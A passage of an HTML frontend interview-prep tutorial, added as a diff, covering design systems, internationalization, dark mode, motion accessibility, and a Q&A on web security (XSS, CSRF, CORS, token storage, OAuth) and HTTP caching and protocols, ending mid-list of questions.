+      <li>Shared prop grammar across every component: same <code>size</code> scale, same <code>variant</code> vocabulary, same controlled/uncontrolled conventions (<code>value</code>/<code>defaultValue</code> + <code>onChange</code>), events named uniformly. Consistency <em>is</em> the product — it's what makes the system learnable.</li>
+      <li>Prefer <strong>composition over prop explosion</strong>: <code>&lt;Card&gt;&lt;Card.Header/&gt;&lt;Card.Body/&gt;&lt;/Card&gt;</code> beats a 30-prop <code>&lt;Card&gt;</code> (tutorial 12's compound-component pattern earning its keep).</li>
+      <li>Bake in accessibility as non-negotiable behavior (focus management, ARIA, keyboard maps) — the strongest ROI argument for a DS: fix it once, every product inherits it. Headless libraries (Radix/React Aria) under styled skins is the common modern split.</li>
+      <li>Every component exposes token-driven styling hooks, not <code>className</code> free-for-all — otherwise consumers fork visually and the system decays.</li>
+    </ul>
+
+    <h3>Versioning &amp; distribution</h3>
+    <ul>
+      <li><strong>Semver with teeth:</strong> visual breaking changes and prop removals are majors; additive props are minors. Automate the discipline with changesets; ship codemods alongside breaking releases (the React team's playbook) so upgrades are mechanical, not archaeological.</li>
+      <li><strong>Distribution trade-off:</strong> a published package gives consumers controlled adoption (they pin versions; you maintain N-1 support) — the default for multiple repos/teams. Monorepo source consumption gives atomic updates but couples every team to your main branch. In MFE setups (tutorial 15), the DS is usually a <em>shared singleton dependency</em> — version skew across remotes is a real coordination problem to name.</li>
+      <li>Deprecate loudly and gradually: console warnings in dev builds, a documented removal horizon, usage telemetry (scan repos for component/prop usage) to know when removal is safe.</li>
+    </ul>
+
+    <h3>Storybook as contract, governance as survival</h3>
+    <ul>
+      <li><strong>Storybook is the living contract:</strong> every component, every state, in isolation — doubling as the documentation site, the manual QA surface, and the mount point for automated checks: visual regression (Chromatic-style snapshot diffs), a11y linting (axe per story), and interaction tests. A PR that changes a button's padding produces a visual diff a designer can approve — that's the design/engineering handshake, automated.</li>
+      <li><strong>Governance models:</strong> a pure core team becomes a bottleneck; pure federation becomes entropy. The workable middle: a small core owning architecture/tokens/review, with a documented <strong>contribution model</strong> — product teams propose via RFC, build in their repo first ("incubate"), promote into the system when a second team needs it. Adoption is a product-management problem: measure it (token coverage, component usage), market it (changelogs, office hours), and make the system path easier than the bespoke path.</li>
+    </ul>
+    <div class="senior">
+      The interview framing that lands: "A design system is a <strong>product whose users are engineers and designers</strong> —
+      so I'd run it like one: an API contract (components + tokens), semver + codemods for change management, Storybook +
+      visual regression as CI, adoption metrics as the KPI, and a contribution process so it scales beyond the core team.
+      The tokens are the schema; the components are the client library."
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2 id="i18n">10. Internationalization <span class="tier tier-2">T2</span></h2>
+    <p>
+      i18n questions test whether you've shipped beyond one locale — and the fastest way to fail one is to treat translation
+      as string substitution. The core principle: <strong>translators translate whole messages, not fragments</strong>, because
+      grammar lives at the sentence level.
+    </p>
+
+    <h3>Why string concatenation breaks translation</h3>
+<pre><code><span class="com">// Untranslatable — assumes English word order, pluralization, and spacing:</span>
+<span class="kw">const</span> msg = <span class="str">'You have '</span> + count + <span class="str">' new '</span> + (count === <span class="num">1</span> ? <span class="str">'message'</span> : <span class="str">'messages'</span>);
+
+<span class="com">// German verb goes elsewhere; Arabic has SIX plural categories; Japanese has no</span>
+<span class="com">// plural inflection; French wants « 0 » treated as singular. Fragments can't adapt.</span></code></pre>
+    <p>
+      The fix is <strong>ICU MessageFormat</strong>: one complete message per key, with typed placeholders, and plural/gender
+      logic <em>inside the translatable string</em> so each locale supplies its own grammar:
+    </p>
+<pre><code><span class="str">"inbox.status"</span>: <span class="str">"{name} has {count, plural,
+    =0    {no new messages}
+    one   {# new message}
+    other {# new messages}
+  } since {lastLogin, date, medium}"</span>
+
+<span class="com">// CLDR defines up to six plural categories: zero / one / two / few / many / other.</span>
+<span class="com">// English uses two; Arabic uses all six; the translator — not your code — picks.</span>
+
+<span class="str">"invite.text"</span>: <span class="str">"{gender, select, female {She invited you} male {He invited you} other {They invited you}}"</span></code></pre>
+    <ul>
+      <li>Libraries (react-intl/FormatJS, i18next + ICU, Lingui) compile these; the runtime plural rules come from <code>Intl.PluralRules</code> — CLDR data shipped in the browser, not in your bundle.</li>
+      <li>Corollaries of "whole messages": never build sentences in JSX by interleaving translated fragments with markup — use rich-text placeholders (<code>"See &lt;link&gt;the docs&lt;/link&gt;"</code>); never reuse one key in two contexts (the same English word declines differently elsewhere); give translators comments/screenshots as context.</li>
+    </ul>
+
+    <h3>The Intl toolbox — stop hand-formatting</h3>
+<pre><code><span class="kw">const</span> n = <span class="num">1234567.891</span>;
+<span class="kw">new</span> Intl.NumberFormat(<span class="str">'de-DE'</span>, { style: <span class="str">'currency'</span>, currency: <span class="str">'EUR'</span> }).format(n);
+<span class="com">// "1.234.567,89 €" — separators, symbol placement, decimals: all locale logic you didn't write</span>
+
+<span class="kw">new</span> Intl.DateTimeFormat(<span class="str">'en-US'</span>, { dateStyle: <span class="str">'medium'</span>, timeZone: <span class="str">'Asia/Kolkata'</span> }).format(<span class="kw">new</span> Date());
+<span class="kw">new</span> Intl.RelativeTimeFormat(<span class="str">'es'</span>, { numeric: <span class="str">'auto'</span> }).format(-<span class="num">1</span>, <span class="str">'day'</span>);   <span class="com">// "ayer"</span>
+<span class="kw">new</span> Intl.ListFormat(<span class="str">'en'</span>, { type: <span class="str">'conjunction'</span> }).format([<span class="str">'a'</span>,<span class="str">'b'</span>,<span class="str">'c'</span>]); <span class="com">// "a, b, and c"</span>
+
+<span class="com">// Segmenter: the only correct way to count/slice user-perceived characters —</span>
+<span class="com">// "👨‍👩‍👧".length === 8, [...str] splits emoji; Segmenter respects grapheme clusters:</span>
+[...<span class="kw">new</span> Intl.Segmenter(<span class="str">'en'</span>, { granularity: <span class="str">'grapheme'</span> }).segment(<span class="str">'👨‍👩‍👧!'</span>)].length; <span class="com">// 2</span>
+
+<span class="com">// Also: Intl.Collator for locale-aware sorting (ä, é, ordering), Intl.PluralRules.</span></code></pre>
+    <div class="pitfall">
+      Truncating usernames with <code>str.slice(0, 20)</code> can cut an emoji or Devanagari cluster in half; sorting with
+      <code>arr.sort()</code> puts "Ö" after "Z" for German users; <code>toLocaleDateString()</code> with no arguments silently
+      uses the <em>runtime's</em> locale — an SSR hydration-mismatch generator (server formats in en-US UTC, client in the
+      user's locale/zone). Always pass explicit locale + timeZone in isomorphic code.
+    </div>
+
+    <h3>RTL: direction is a layout dimension</h3>
+    <ul>
+      <li>Set <code>&lt;html dir="rtl" lang="ar"&gt;</code> — flow, alignment, and UA styles flip. But physical CSS fights it: <code>margin-left: 8px</code> stays left in a right-to-left layout.</li>
+      <li><strong>CSS logical properties</strong> are the systemic fix — write direction-relative CSS once: <code>margin-inline-start</code> / <code>padding-inline-end</code> / <code>inset-inline-start</code> / <code>border-start-start-radius</code>, plus <code>text-align: start</code>. Flex/grid are direction-aware already. Stylelint can enforce logical-only.</li>
+      <li>Nuances that show real experience: directional icons (back arrows, "next" chevrons) must mirror, but brand marks, clocks, and media controls don't; numbers and embedded Latin stay LTR inside RTL text (the bidi algorithm handles it — wrap user-generated fragments in <code>&lt;bdi&gt;</code> so a Latin username doesn't scramble Arabic punctuation).</li>
+    </ul>
+
+    <h3>Locale routing, SSR, and bundle strategy</h3>
+    <ul>
+      <li><strong>URL-visible locale</strong> (<code>/de/pricing</code> or <code>de.example.com</code>) beats cookie/header-only negotiation: shareable, cacheable (no <code>Vary</code> gymnastics), crawlable. Use <code>Accept-Language</code> only to <em>suggest</em> a redirect on first visit; let the user override and persist it; emit <code>hreflang</code> alternates for SEO.</li>
+      <li><strong>SSR determinism:</strong> render with the locale and time zone resolved <em>on the server from the request</em> and pass them down explicitly, so server and client HTML agree (see the hydration pitfall above).</li>
+      <li><strong>Lazy-load locale data:</strong> ship only the active locale's messages — <code>import(`./locales/${locale}.json`)</code> as a route-level split point (locale changes are rare; a reload is acceptable). Extraction tooling pulls messages from source at build time; pseudo-localization builds (<code>"Ẅéļçöṁé ţö ţĥé àþþ ōņé ţŵö"</code> — longer, accented) catch hardcoded strings and truncating layouts before translators do. Design for <strong>text expansion</strong>: German/Finnish routinely run 30–40% longer; fixed-width buttons and <code>white-space: nowrap</code> are the classic casualties.</li>
+    </ul>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2 id="dark-mode">11. Dark mode &amp; theming <span class="tier tier-3">T3</span></h2>
+    <p>
+      A deceptively rich practical question: it touches system preferences, FOUC-avoidance, storage, token architecture,
+      and design judgment — in five minutes of interview time.
+    </p>
+
+    <h3>The platform primitives</h3>
+<pre><code><span class="com">/* React to the OS/browser preference: */</span>
+<span class="kw">@media</span> (prefers-color-scheme: dark) {
+  :root { --color-surface: <span class="num">#111827</span>; }
+}
+
+<span class="com">/* Tell the UA itself which schemes you support — form controls, scrollbars,</span>
+<span class="com">   and the default canvas follow without custom CSS: */</span>
+:root { color-scheme: light dark; }
+
+<span class="com">/* Scheme-dependent values inline (2024+ platform feature): */</span>
+color: <span class="kw">light-dark</span>(<span class="num">#111827</span>, <span class="num">#f9fafb</span>);</code></pre>
+    <p>
+      <code>prefers-color-scheme</code> alone gives a <em>two-state</em> experience (follow the OS). Real products need
+      <strong>three states — light / dark / system</strong> — because "follow my OS except this app" is a legitimate, common
+      preference. That means a stored override plus a data attribute, and the media query only as the "system" fallback.
+    </p>
+
+    <h3>The no-FOUC toggle — the classic implementation question</h3>
+    <p>
+      The naive version reads localStorage in a <code>useEffect</code> — which runs <em>after first paint</em>, so dark-mode
+      users get a white flash on every load. The fix is a tiny <strong>render-blocking inline script in
+      <code>&lt;head&gt;</code></strong>, before any content, so the attribute exists before first paint:
+    </p>
+<pre><code>&lt;head&gt;
+  &lt;script&gt;
+    <span class="com">// Inline + blocking ON PURPOSE: must run before first paint.</span>
+    <span class="com">// (Give it a CSP nonce or hash — ties back to §1.)</span>
+    (<span class="kw">function</span> () {
+      <span class="kw">try</span> {
+        <span class="kw">var</span> stored = localStorage.getItem(<span class="str">'theme'</span>);        <span class="com">// 'light' | 'dark' | null</span>
+        <span class="kw">var</span> theme = stored ||
+          (matchMedia(<span class="str">'(prefers-color-scheme: dark)'</span>).matches ? <span class="str">'dark'</span> : <span class="str">'light'</span>);
+        document.documentElement.dataset.theme = theme;
+        document.documentElement.style.colorScheme = theme;
+      } <span class="kw">catch</span> (e) { <span class="com">/* storage blocked → fall through to CSS default */</span> }
+    })();
+  &lt;/script&gt;
+  &lt;link rel=<span class="str">"stylesheet"</span> href=<span class="str">"/styles.css"</span>&gt;
+&lt;/head&gt;</code></pre>
+    <ul>
+      <li>Store <strong>only the override</strong>: choosing "system" means <em>removing</em> the stored key, so future OS changes flow through. Listen to <code>matchMedia('(prefers-color-scheme: dark)').addEventListener('change', …)</code> to react live while in system mode.</li>
+      <li>SSR nuance: the server doesn't know the preference (localStorage is client-only), so either accept the inline-script approach (attribute set before paint, no flash) or persist the choice in a cookie so the server renders the right attribute directly. Sync across tabs via the <code>storage</code> event.</li>
+      <li>Set <code>&lt;meta name="color-scheme" content="light dark"&gt;</code> so even the pre-CSS blank page background matches — the last sliver of flash.</li>
+    </ul>
+
+    <h3>Semantic tokens make themes cheap</h3>
+    <p>
+      If §9's token architecture is in place, dark mode is <em>one reassignment of the semantic layer</em> under
+      <code>[data-theme="dark"]</code> — zero component changes, and a future brand theme is the same shape of work.
+      If components hardcode hex values, dark mode is a migration project. This is the interview link to make explicitly:
+      "dark mode is trivial or terrible depending entirely on whether the token indirection exists."
+    </p>
+
+    <h3>Design judgment in dark mode (what seniors add)</h3>
+    <ul>
+      <li><strong>Not inverted, re-lit:</strong> avoid pure black (#000) surfaces with pure white text — harsh halation; dark gray (#111–#1e) with off-white (~87% white) is the norm. Desaturate brand colors — saturated hues vibrate against dark; most palettes need lighter, softer variants to keep AA contrast (contrast requirements don't relax in the dark).</li>
+      <li><strong>Elevation flips medium:</strong> shadows are nearly invisible on dark backgrounds — elevation is communicated by <em>lighter surface color</em> instead ("the higher, the lighter"), which is why <code>surface</code>/<code>surface-raised</code>/<code>surface-overlay</code> deserve separate tokens.</li>
+      <li><strong>Images and media:</strong> pure-white backgrounds glare — options: <code>&lt;picture media="(prefers-color-scheme: dark)"&gt;</code> variants for illustrations/logos, a slight <code>filter: brightness(.9)</code> on photos, and transparent-background assets designed for both. Borders often need to get <em>lighter</em> relative to surfaces, not darker.</li>
+    </ul>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2 id="motion-a11y">12. Motion, animation &amp; accessibility <span class="tier tier-3">T3</span></h2>
+    <p>
+      Motion accessibility is a small topic with outsized signal: it shows you think of animation as a user-facing contract,
+      not decoration. The context that makes it concrete: for people with <strong>vestibular disorders</strong> (a substantial
+      population — inner-ear balance dysfunction), large-scale motion — parallax, zooms, full-screen slides, scroll-linked
+      effects — triggers genuine dizziness, nausea, and migraines. This is a health issue, not a preference.
+    </p>
+
+    <h3>prefers-reduced-motion — and why reduce ≠ remove</h3>
+<pre><code><span class="com">/* Feedback still matters — swap MOVEMENT for a fade, don't delete the cue: */</span>
+.toast { animation: slide-in-up <span class="num">300ms</span> ease-out; }
+
+<span class="kw">@media</span> (prefers-reduced-motion: reduce) {
+  .toast { animation: fade-in <span class="num">150ms</span> linear; }   <span class="com">/* still announces itself */</span>
+}
+
+<span class="com">/* JS side — gate scroll-linked/JS-driven animation: */</span>
+<span class="kw">const</span> reduce = matchMedia(<span class="str">'(prefers-reduced-motion: reduce)'</span>).matches;
+el.scrollIntoView({ behavior: reduce ? <span class="str">'auto'</span> : <span class="str">'smooth'</span> });</code></pre>
+    <ul>
+      <li>The preference means "less, calmer, smaller" — <em>removing all transitions</em> can itself harm usability (state changes become teleports with no causality). Target the <em>vestibular triggers</em>: translation across large distances, scaling/zooming, parallax, spin. Opacity fades and small color transitions are generally fine to keep.</li>
+      <li>Two implementation stances: opt-out per animation (the media query above), or the blunt-but-safe global kill switch (<code>animation-duration: 0.01ms !important</code> under reduce) for codebases that can't audit every animation. In React, wrap <code>matchMedia</code> in a <code>useSyncExternalStore</code>-based <code>usePrefersReducedMotion()</code> hook and let motion components consume it; animation libraries (Framer Motion's <code>MotionConfig reducedMotion="user"</code>) can honor it globally.</li>
+      <li>Autoplaying video/carousels: reduced motion is the signal to not autoplay; WCAG separately requires a pause/stop control for anything auto-moving longer than 5 s, and nothing may flash more than 3 times/second.</li>
+    </ul>
+
+    <h3>Performance is accessibility: compositor-friendly animation</h3>
+    <p>
+      Janky animation is its own accessibility failure (and an INP problem — tutorial 17). The rule set: animate only
+      <strong><code>transform</code> and <code>opacity</code></strong> — compositor-thread properties that skip layout and
+      paint and stay smooth while the main thread is busy; never animate <code>top/left/width/height</code>;
+      <code>will-change</code> sparingly for known-upcoming animations. For "impossible" layout animations, know
+      <strong>FLIP</strong> by name: <em>First, Last, Invert, Play</em> — measure the start and end positions, apply an
+      inverting transform so the element <em>appears</em> unmoved, then animate the transform to zero. Layout cost happens
+      once up front; the animation itself is pure compositor. This is what Framer Motion's layout animations and the
+      spring-physics libraries do under the hood.
+    </p>
+
+    <h3>View Transitions API — the modern answer to "animate this navigation"</h3>
+<pre><code><span class="com">// Same-document (SPA) — browser snapshots old state, you mutate, it cross-fades:</span>
+document.startViewTransition(() =&gt; {
+  root.render(&lt;NextRoute /&gt;);                <span class="com">// any DOM update works</span>
+});
+
+<span class="com">/* Pair elements across states for shared-element morphs: */</span>
+.card-thumb  { view-transition-name: hero-img; }
+.detail-img  { view-transition-name: hero-img; }
+
+<span class="com">/* And respect reduced motion — snapshots still swap, just without motion: */</span>
+<span class="kw">@media</span> (prefers-reduced-motion: reduce) {
+  ::view-transition-group(*) { animation-duration: <span class="num">0.01ms</span>; }
+}</code></pre>
+    <p>
+      Cross-document view transitions (opt-in via <code>@view-transition</code>) extend the same model to MPA navigations.
+      Interview-level take: "shared-element transitions used to require FLIP gymnastics; the platform now snapshots and
+      animates for me — I gate it on browser support and reduced motion." React Router and Next have integrations;
+      it's progressive enhancement, so no fallback code is needed beyond <em>not</em> transitioning.
+    </p>
+
+    <h3>Focus and forced colors — the adjacent essentials</h3>
+    <ul>
+      <li><strong><code>:focus-visible</code></strong> ended the "designers hate focus rings so we removed them" era: it matches only when the browser judges focus should be visible (keyboard/assistive navigation), not on mouse clicks. Pattern: <code>:focus-visible { outline: 2px solid var(--color-focus); outline-offset: 2px; }</code> — and never <code>outline: none</code> without a visible replacement. Note <code>outline</code> doesn't trigger layout — animating it is cheap.</li>
+      <li><strong>Forced-colors mode</strong> (Windows High Contrast) discards your palette entirely and repaints with user-chosen system colors. Your CSS colors, shadows, and background images vanish — which breaks UI that communicates state through background color alone (toggle switches are the classic casualty). Test with the <code>forced-colors: active</code> media query and DevTools emulation; use semantic HTML (real <code>&lt;button&gt;</code>s get sensible system styling for free), keep borders on meaningful boundaries, and use <code>SystemColor</code> keywords (<code>Canvas</code>, <code>ButtonText</code>, <code>Highlight</code>) where you must intervene. <code>forced-color-adjust: none</code> exists for the rare element (color swatches) where your color IS the content.</li>
+    </ul>
+    <div class="senior">
+      The synthesis answer for "how do you approach animation in a product": "Motion has three contracts — <em>purpose</em>
+      (it explains a state change, or it goes), <em>performance</em> (compositor-only properties, FLIP or View Transitions
+      for layout morphs), and <em>consent</em> (reduced-motion users get the meaning without the movement). A design-system
+      motion token set — durations, easings, distance scales — makes all three enforceable instead of aspirational."
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2 id="qa">Interview Q&amp;A</h2>
+
+    <details class="qa">
+      <summary>1. Explain the three types of XSS with an example of each.</summary>
+      <div class="answer"><p><strong>Reflected:</strong> payload in the request, echoed into the response — a crafted link like <code>/search?q=&lt;script&gt;…&lt;/script&gt;</code> rendered into "results for…". <strong>Stored:</strong> payload persisted server-side (a comment, a profile bio) and served to every viewer — no link needed, wormable. <strong>DOM-based:</strong> never touches the server — a client-side source (<code>location.hash</code>, <code>postMessage</code>) flows into a sink (<code>innerHTML</code>, <code>eval</code>); the fragment isn't even sent to the server, so server defenses can't see it. Frame the impact: attacker JS in your origin means the SOP now works for them — session use, token exfiltration, keylogging.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>2. "React prevents XSS" — attack that statement.</summary>
+      <div class="answer"><p>React escapes <em>interpolated values rendered as content</em> — one context. It does nothing for: <code>dangerouslySetInnerHTML</code> (including markdown/CMS HTML rendered through it), <code>javascript:</code> URLs in <code>href/src</code> (valid attribute value — the protocol is the attack; validate with <code>new URL()</code> against an allowlist), SSR state serialization (<code>&lt;/script&gt;</code> inside JSON breaks out of the script tag — escape <code>&lt;</code>), spread props smuggling dangerous attributes, and third-party components that accept raw HTML. The audit surface is exactly those escape hatches.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>3. Design a strict CSP for a React SPA and explain each directive.</summary>
+      <div class="answer"><p>Nonce-based: <code>script-src 'nonce-…' 'strict-dynamic' https: 'unsafe-inline'; object-src 'none'; base-uri 'none'; frame-ancestors 'self'; connect-src 'self' api.example.com; report-to csp</code>. Per-response random nonce on legitimate script tags — injected scripts can't know it. <code>'strict-dynamic'</code> lets nonced loaders inject chunks (bundler compatibility); the <code>https: 'unsafe-inline'</code> tail is ignored by modern browsers and only serves as legacy fallback. <code>base-uri 'none'</code> blocks <code>&lt;base&gt;</code> hijacks of relative URLs; <code>connect-src</code> limits exfiltration targets; report-only first, then enforce. Static hosting wrinkle: no server to mint nonces → hash the inline bootstrap or stamp nonces at the edge.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>4. An XSS is found in production. Walk me through your response as frontend lead.</summary>
+      <div class="answer"><p>(1) <strong>Contain:</strong> if it's stored XSS, disable rendering of the affected content path (feature flag / kill switch); ship the sink fix — that's usually a one-liner once located. (2) <strong>Invalidate what's stolen:</strong> assume session/token theft for exposed users — rotate sessions, force re-auth, revoke refresh-token families; check whether tokens were exfiltratable (localStorage?) vs httpOnly. (3) <strong>Hunt siblings:</strong> the same pattern rarely exists once — grep every sink (<code>dangerouslySetInnerHTML</code>, <code>innerHTML</code>, URL props). (4) <strong>Harden:</strong> add/tighten CSP so the class is blast-radius-limited next time — and note CSP <em>reports</em> would have detected this earlier. (5) <strong>Postmortem:</strong> lint rules banning raw sinks, sanitization at a choke point, security review for HTML-rendering features. Mentioning user notification/compliance obligations is a bonus signal.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>5. Explain CSRF and why your JWT-in-header API "isn't vulnerable." Is that the whole story?</summary>
+      <div class="answer"><p>CSRF = attacker page makes the victim's browser send a state-changing request that rides <em>automatically attached</em> credentials — i.e., cookies. A bearer token in <code>Authorization</code> must be attached by your JS, which an attacker's page can't do (custom headers require CORS-approved fetch, and they can't read the token anyway) — so header-auth APIs are inherently CSRF-resistant. The "whole story" caveats: the moment anyone adds cookie auth "just for SSR" or puts the JWT in a cookie, CSRF is back; the login form still needs protection (login CSRF); and where the SPA <em>gets</em> the token (refresh-cookie endpoint) is itself cookie-authenticated and needs SameSite/origin checks.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>6. SameSite=Lax is the default now. Are we done with CSRF defenses?</summary>
+      <div class="answer"><p>No — Lax has known gaps: it still sends cookies on <strong>top-level GET navigations</strong>, so any state-changing GET endpoint remains exploitable via a plain link; "site" is eTLD+1, so any sibling subdomain (or a subdomain takeover) is <em>same-site</em> and unrestricted; some browsers had a 2-minute "Lax+POST" grace window; and you don't control every client's browser/config. Defense-in-depth stance: SameSite as the platform baseline, plus an application-level check — anti-CSRF token, custom-header requirement, or <code>Sec-Fetch-Site</code> validation — on every mutation, and strict GET/POST semantics.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>7. Walk me through exactly what happens when a CORS preflight fails.</summary>
+      <div class="answer"><p>The browser classified the request as non-simple (method beyond GET/HEAD/POST, or a custom header, or a content type beyond form/text) and sent <code>OPTIONS</code> with <code>Origin</code>, <code>Access-Control-Request-Method</code>, and <code>Access-Control-Request-Headers</code> — no body, no credentials. The server's response failed the check: missing/mismatched <code>Access-Control-Allow-Origin</code>, method or header not listed, non-2xx status, or a redirect (preflights must not redirect). Consequence: <strong>the actual request is never sent</strong>. JS gets a generic <code>TypeError: Failed to fetch</code> — deliberately opaque; the specific reason is only in the console/Network panel. Fix on the <em>server</em> (or gateway): answer OPTIONS with the right allow-headers, add <code>Access-Control-Max-Age</code> to cache the verdict, and remember error responses need CORS headers too or clients can't even read failures.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>8. Why can't you use <code>Access-Control-Allow-Origin: *</code> with credentials, and what's the equally bad workaround?</summary>
+      <div class="answer"><p>With <code>credentials: 'include'</code>, responses carry the user's authenticated data; <code>*</code> would mean "any website on the internet may read this user's data via their browser" — so the spec forbids the combination (and wildcards in allow-headers/methods too). The equally bad workaround is <strong>echoing the request's <code>Origin</code> back unvalidated</strong> with <code>Allow-Credentials: true</code> — functionally identical to the forbidden wildcard. Correct: validate the origin against an allowlist, echo only if it matches, and send <code>Vary: Origin</code> so caches don't serve one origin's CORS verdict to another.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>9. "CORS is blocking my request — the API is protected, right?"  Correct the misconception.</summary>
+      <div class="answer"><p>CORS protects <em>users</em>, not servers. Simple cross-origin requests are <em>sent and processed</em> — only the response <em>read</em> is blocked in the browser; and nothing about CORS applies to curl, Postman, or a server-side attacker. What CORS prevents is a malicious website using a victim's browser — with the victim's cookies and network position — to read your API's responses. Server protection is authn/authz, rate limiting, CSRF defense. Corollary: loosening CORS never "opens your API to hackers" directly — it endangers your <em>users' data</em> via their own browsers.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>10. Argue localStorage vs cookies for a JWT — both sides, then commit.</summary>
+      <div class="answer"><p>localStorage: CSRF-immune (you attach the header), simple, no SameSite gymnastics — but readable by any injected script, so XSS becomes <em>credential exfiltration</em>: offline replay, persists past the session, sellable. httpOnly cookie: not readable by JS, so XSS is limited to <em>session riding</em> while the victim's page is open — bounded and revocable — but you inherit CSRF (answerable: SameSite + tokens) and 4 KB/every-request costs. Both lose under XSS, but they lose asymmetrically: exfiltration is strictly worse, and CSRF has platform-level answers while readable storage has none. Commit: short-lived access token in memory + rotating refresh token in a path-scoped httpOnly SameSite=Strict cookie; BFF (no tokens in the browser) when the bar is higher.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>11. What is refresh-token rotation and what attack does reuse detection catch?</summary>
+      <div class="answer"><p>Every call to the refresh endpoint returns a <em>new</em> refresh token and invalidates the one just used — tokens are single-use links in a chain (a "family"). If a refresh token is stolen, both the attacker and the legitimate user eventually present the <em>same</em> token; whichever presents second is using an already-rotated token. That reuse is unambiguous evidence of theft → the server revokes the entire family, forcing re-authentication for both parties. So rotation converts "silent long-term compromise" into "detected incident with bounded damage" — the reason OAuth security BCPs mandate it for browser clients.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>12. Why is the implicit OAuth flow deprecated, and what does PKCE actually prove?</summary>
+      <div class="answer"><p>Implicit returned tokens <em>in the URL fragment</em>: exposed to browser history, referrer leakage, extensions, and shoulder-surfing logs, with no client authentication and no rotation-friendly code exchange. Authorization Code + PKCE fixes it: the client generates a random <code>code_verifier</code>, sends its SHA-256 hash (<code>code_challenge</code>) with the initial redirect, and must present the original verifier at the token exchange. An attacker who intercepts the redirect (or reads the code from a log) can't redeem it — they can't invert the hash. PKCE proves <em>the same client that started the flow is finishing it</em>, replacing the client secret that a public browser app can never keep.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>13. What do COOP and COEP do, and when did you last need them?</summary>
+      <div class="answer"><p>They establish <strong>cross-origin isolation</strong>. COOP <code>same-origin</code> severs window references with cross-origin openers/popups so your page gets its own browsing-context group (own process); COEP <code>require-corp</code> refuses to load any embedded resource that hasn't opted in via CORS/CORP. Both set → <code>crossOriginIsolated === true</code>, which unlocks <code>SharedArrayBuffer</code> and precise timers (gated post-Spectre, since speculative execution reads process memory). The "when": adopting anything WASM-multithreaded — ffmpeg.wasm, SQLite-wasm, pthreads builds — which fails without them; the migration cost is that every cross-origin asset now needs CORS/CORP headers, and COOP can break <code>window.opener</code>-based OAuth popups (<code>same-origin-allow-popups</code>).</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>14. no-cache vs no-store vs immutable — precise definitions.</summary>
+      <div class="answer"><p><code>no-cache</code>: <em>may store, must revalidate before every use</em> — with an ETag that's a cheap conditional request and a 304, not a re-download. <code>no-store</code>: never write to any cache — the actual "don't cache," for sensitive responses (and it disqualifies the document from bfcache — don't blanket it). <code>immutable</code>: "this URL's bytes will never change — skip revalidation even on reload," correct only for content-hashed URLs where the URL <em>is</em> the version. The classic confusion — thinking <code>no-cache</code> means "don't cache" — is exactly what the question screens for.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>15. Design the caching strategy for a SPA release. What makes deploys atomic?</summary>
+      <div class="answer"><p>Content-hash every built asset and serve <code>/assets/*</code> with <code>public, max-age=31536000, immutable</code>; serve HTML with <code>no-cache</code> + ETag (or <code>max-age=0, s-maxage=300, stale-while-revalidate=60</code> to let the CDN absorb load); authenticated API responses <code>private</code>/<code>no-store</code>. Atomicity: HTML is the single mutable pointer — a deploy publishes new hashed assets <em>then</em> new HTML referencing them; users get either the complete old graph or the complete new one, never a mix. Keep the previous build's assets available for in-flight sessions and lazy-loaded chunks (a freshly-purged CDN + old open tab = chunk 404s — handle with a reload-on-chunk-error boundary). No purges, no version skew, repeat visits cost zero asset requests.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>16. Your load balancer serves stale CORS headers to the wrong origin sometimes. What's missing?</summary>
+      <div class="answer"><p><code>Vary: Origin</code>. The CDN/proxy caches responses by URL; if the response's <code>Access-Control-Allow-Origin</code> is computed per-request (echoed from an allowlist), two origins share one cache entry — origin B receives the copy stamped for origin A and the browser blocks the read (intermittently, per-edge-node, which is why it's maddening to debug). Declaring <code>Vary: Origin</code> partitions the cache key by requesting origin. Same family of bug: missing <code>Vary: Accept-Encoding</code> serving brotli to gzip-only clients, or varying on <code>Cookie</code> accidentally disabling shared caching entirely.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>17. What did HTTP/2 fix, what did it not fix, and how does HTTP/3 finish the job?</summary>
+      <div class="answer"><p>H2 fixed application-layer head-of-line blocking: binary framing multiplexes many streams over one TCP connection (plus HPACK header compression and priorities), obsoleting sharding/spriting/concatenation. It could not fix <em>TCP's</em> HOL: TCP delivers one ordered byte stream, so a single lost packet stalls every stream until retransmission — on lossy mobile networks H2 can underperform six H1.1 connections. H3 moves to QUIC over UDP: reliability is per-stream, so loss stalls only the affected stream; TLS 1.3 is integrated (1-RTT, 0-RTT resumption — idempotent-only due to replay); and connection IDs survive network switches (Wi-Fi→LTE without re-handshake). Bonus currency: H2 Server Push is dead (Chrome removed it) — 103 Early Hints took its use case.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>18. "HTTP/2 made bundling obsolete." Take a position.</summary>
+      <div class="answer"><p>False, and quantifiably so. Multiplexing removed the per-connection cost of many files, but: compression works dramatically better across one large file than 2,000 independently-compressed modules; unbundled module graphs create discovery waterfalls (import depth = sequential round trips) unless you preload the entire graph; and per-request scheduling/cache-lookup overhead still exists. What H2/H3 actually changed is the optimum: from one monolith to <strong>a few dozen route/vendor chunks</strong> — fine enough that one change doesn't invalidate the whole cache, coarse enough to compress and schedule well. Codebase-wide no-bundling (dev-mode Vite style) is a dev-experience tool, not a production strategy.</p></div>
+    </details>
+
+    <details class="qa">
+      <summary>19. SSE vs WebSocket for a notifications feed — decide and defend.</summary>
